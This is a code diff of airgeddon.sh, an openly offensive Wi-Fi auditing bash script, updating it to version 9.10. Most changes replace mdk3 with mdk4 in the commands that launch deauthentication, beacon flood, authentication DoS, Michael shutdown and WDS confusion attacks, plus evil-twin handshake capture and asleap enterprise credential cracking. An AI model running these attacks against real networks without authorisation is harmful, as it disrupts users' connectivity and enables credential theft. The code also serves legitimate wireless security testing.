@@ -2,8 +2,8 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20190206
-#Version......: 9.02
+#Date.........: 20190213
+#Version......: 9.10
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -41,7 +41,7 @@ optional_tools_names=(
 						"wpaclean"
 						"crunch"
 						"aireplay-ng"
-						"mdk3"
+						"mdk4"
 						"hashcat"
 						"hostapd"
 						"dhcpd"
@@ -79,7 +79,7 @@ declare -A possible_package_names=(
 									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
 									[${optional_tools_names[1]}]="crunch" #crunch
 									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
-									[${optional_tools_names[3]}]="mdk3" #mdk3
+									[${optional_tools_names[3]}]="mdk4" #mdk4
 									[${optional_tools_names[4]}]="hashcat" #hashcat
 									[${optional_tools_names[5]}]="hostapd" #hostapd
 									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
@@ -109,8 +109,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="9.02"
-language_strings_expected_version="9.02-1"
+airgeddon_version="9.10"
+language_strings_expected_version="9.10-1"
 standardhandshake_filename="handshake-01.cap"
 timeout_capture_handshake="20"
 tmpdir="/tmp/"
@@ -3338,11 +3338,11 @@ function launch_dos_pursuit_mode_attack() {
 
 	recalculate_windows_sizes
 	case "${1}" in
-		"mdk3 amok attack")
+		"mdk4 amok attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 		;;
 		"aireplay deauth attack")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
@@ -3355,31 +3355,31 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 		;;
 		"beacon flood attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
 		;;
 		"auth dos attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
 		;;
 		"michael shutdown attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk4 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
 		;;
-		"Mdk3")
+		"Mdk4")
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
 		;;
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
@@ -3392,7 +3392,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk4 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
 		;;
 	esac
 
@@ -3485,8 +3485,8 @@ pid_control_pursuit_mode() {
 	kill_dos_pursuit_mode_processes
 }
 
-#Execute mdk3 deauth DoS attack
-function exec_mdk3deauth() {
+#Execute mdk4 deauth DoS attack
+function exec_mdk4deauth() {
 
 	debug_print
 
@@ -3504,13 +3504,13 @@ function exec_mdk3deauth() {
 		language_strings "${language}" 4 "read"
 
 		dos_pursuit_mode_pids=()
-		launch_dos_pursuit_mode_attack "mdk3 amok attack" "first_time"
-		pid_control_pursuit_mode "mdk3 amok attack"
+		launch_dos_pursuit_mode_attack "mdk4 amok attack" "first_time"
+		pid_control_pursuit_mode "mdk4 amok attack"
 	else
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
 	fi
 }
 
@@ -3566,7 +3566,7 @@ function exec_wdsconfusion() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
 	fi
 }
 
@@ -3593,7 +3593,7 @@ function exec_beaconflood() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk4 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
 	fi
 }
 
@@ -3620,7 +3620,7 @@ function exec_authdos() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk4 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
 	fi
 }
 
@@ -3647,12 +3647,12 @@ function exec_michaelshutdown() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk4 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
 	fi
 }
 
-#Validate Mdk3 parameters
-function mdk3_deauth_option() {
+#Validate Mdk4 parameters
+function mdk4_deauth_option() {
 
 	debug_print
 
@@ -3683,7 +3683,7 @@ function mdk3_deauth_option() {
 		dos_pursuit_mode=1
 	fi
 
-	exec_mdk3deauth
+	exec_mdk4deauth
 }
 
 #Validate Aireplay parameters
@@ -4256,7 +4256,7 @@ function initialize_menu_options_dependencies() {
 	clean_handshake_dependencies=(${optional_tools_names[0]})
 	aircrack_attacks_dependencies=(${optional_tools_names[1]})
 	aireplay_attack_dependencies=(${optional_tools_names[2]})
-	mdk3_attack_dependencies=(${optional_tools_names[3]})
+	mdk4_attack_dependencies=(${optional_tools_names[3]})
 	hashcat_attacks_dependencies=(${optional_tools_names[4]})
 	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
 	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
@@ -7245,30 +7245,34 @@ function handle_asleap_attack() {
 	debug_print
 
 	if [ -f "${tmpdir}${enterprisedir}${enterprise_successfile}" ]; then
-		ask_yesno 537 "no"
-		if [ "${yesno}" = "y" ]; then
+		local result
+		result=$(cat "${tmpdir}${enterprisedir}${enterprise_successfile}")
+		if [[ ${result} -eq 0 ]] || [[ ${result} -eq 2 ]]; then
+			ask_yesno 537 "no"
+			if [ "${yesno}" = "y" ]; then
 
-			asleap_attack_finished=0
+				asleap_attack_finished=0
 
-			if [ ${enterprise_mode} = "noisy" ]; then
-				if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
-					echo
-					language_strings "${language}" 542 "yellow"
-				else
-					select_captured_enterprise_user
+				if [ ${enterprise_mode} = "noisy" ]; then
+					if [ ${#enterprise_captured_challenges_responses[@]} -eq 1 ]; then
+						echo
+						language_strings "${language}" 542 "yellow"
+					else
+						select_captured_enterprise_user
+					fi
 				fi
+
+				echo
+				language_strings "${language}" 538 "blue"
+
+				while [[ "${asleap_attack_finished}" != "1" ]]; do
+					ask_dictionary
+					echo
+					exec_asleap_attack
+					echo
+					manage_asleap_pot
+				done
 			fi
-
-			echo
-			language_strings "${language}" 538 "blue"
-
-			while [[ "${asleap_attack_finished}" != "1" ]]; do
-				ask_dictionary
-				echo
-				exec_asleap_attack
-				echo
-				manage_asleap_pot
-			done
 		fi
 	fi
 }
@@ -7850,19 +7854,19 @@ function exec_et_deauth() {
 	prepare_et_monitor
 
 	case ${et_dos_attack} in
-		"Mdk3")
-			kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
+		"Mdk4")
+			kill "$(ps -C mdk4 --no-headers -o pid)" &> /dev/null
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
-			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+			deauth_et_cmd="mdk4 ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
 		;;
 		"Aireplay")
 			kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
 			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
 		;;
 		"Wds Confusion")
-			kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
-			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
+			kill "$(ps -C mdk4 --no-headers -o pid)" &> /dev/null
+			deauth_et_cmd="mdk4 ${iface_monitor_et_deauth} w -e ${essid} -c ${channel}"
 		;;
 	esac
 
@@ -9504,8 +9508,8 @@ function kill_et_windows() {
 	if [ "${dos_pursuit_mode}" -eq 1 ]; then
 		kill_dos_pursuit_mode_processes
 		case ${et_dos_attack} in
-			"Mdk3"|"Wds Confusion")
-				kill "$(ps -C mdk3 --no-headers -o pid)" &> /dev/null
+			"Mdk4"|"Wds Confusion")
+				kill "$(ps -C mdk4 --no-headers -o pid)" &> /dev/null
 			;;
 			"Aireplay")
 				kill "$(ps -C aireplay-ng --no-headers -o pid)" &> /dev/null
@@ -9714,13 +9718,13 @@ function dos_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
-	language_strings "${language}" 51 mdk3_attack_dependencies[@]
+	language_strings "${language}" 51 mdk4_attack_dependencies[@]
 	language_strings "${language}" 52 aireplay_attack_dependencies[@]
-	language_strings "${language}" 53 mdk3_attack_dependencies[@]
+	language_strings "${language}" 53 mdk4_attack_dependencies[@]
 	language_strings "${language}" 54 "separator"
-	language_strings "${language}" 62 mdk3_attack_dependencies[@]
-	language_strings "${language}" 63 mdk3_attack_dependencies[@]
-	language_strings "${language}" 64 mdk3_attack_dependencies[@]
+	language_strings "${language}" 62 mdk4_attack_dependencies[@]
+	language_strings "${language}" 63 mdk4_attack_dependencies[@]
+	language_strings "${language}" 64 mdk4_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " dos_option
@@ -9744,7 +9748,7 @@ function dos_attacks_menu() {
 			if contains_element "${dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				mdk3_deauth_option
+				mdk4_deauth_option
 			fi
 		;;
 		6)
@@ -9803,11 +9807,11 @@ function capture_handshake_evil_twin() {
 	capture_handshake_window
 
 	case ${et_dos_attack} in
-		"Mdk3")
+		"Mdk4")
 			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 			echo "${bssid}" > "${tmpdir}bl.txt"
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 			sleeptimeattack=12
 		;;
 		"Aireplay")
@@ -9818,7 +9822,7 @@ function capture_handshake_evil_twin() {
 		;;
 		"Wds Confusion")
 			recalculate_windows_sizes
-			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 			sleeptimeattack=16
 		;;
 	esac
@@ -10254,9 +10258,9 @@ function attack_handshake_menu() {
 	print_simple_separator
 	language_strings "${language}" 147
 	print_simple_separator
-	language_strings "${language}" 139 mdk3_attack_dependencies[@]
+	language_strings "${language}" 139 mdk4_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk3_attack_dependencies[@]
+	language_strings "${language}" 141 mdk4_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " attack_handshake_option
@@ -10274,7 +10278,7 @@ function attack_handshake_menu() {
 				rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
 				echo "${bssid}" > "${tmpdir}bl.txt"
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "mdk4 amok attack" -e mdk4 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -10299,7 +10303,7 @@ function attack_handshake_menu() {
 				ask_timeout "capture_handshake"
 				capture_handshake_window
 				recalculate_windows_sizes
-				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+				xterm +j -bg black -fg red -geometry "${g1_bottomleft_window}" -T "wids / wips / wds confusion attack" -e mdk4 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 				sleeptimeattack=16
 			fi
 		;;
@@ -11124,9 +11128,9 @@ function et_dos_menu() {
 		language_strings "${language}" 266
 	fi
 	print_simple_separator
-	language_strings "${language}" 139 mdk3_attack_dependencies[@]
+	language_strings "${language}" 139 mdk4_attack_dependencies[@]
 	language_strings "${language}" 140 aireplay_attack_dependencies[@]
-	language_strings "${language}" 141 mdk3_attack_dependencies[@]
+	language_strings "${language}" 141 mdk4_attack_dependencies[@]
 	print_hint ${current_menu}
 
 	read -rp "> " et_dos_option
@@ -11141,7 +11145,7 @@ function et_dos_menu() {
 			if contains_element "${et_dos_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				et_dos_attack="Mdk3"
+				et_dos_attack="Mdk4"
 
 				echo
 				language_strings "${language}" 509 "yellow"
@@ -13289,7 +13293,7 @@ function remove_warnings() {
 	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
 	echo "${aircrack_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
-	echo "${mdk3_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${mdk4_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
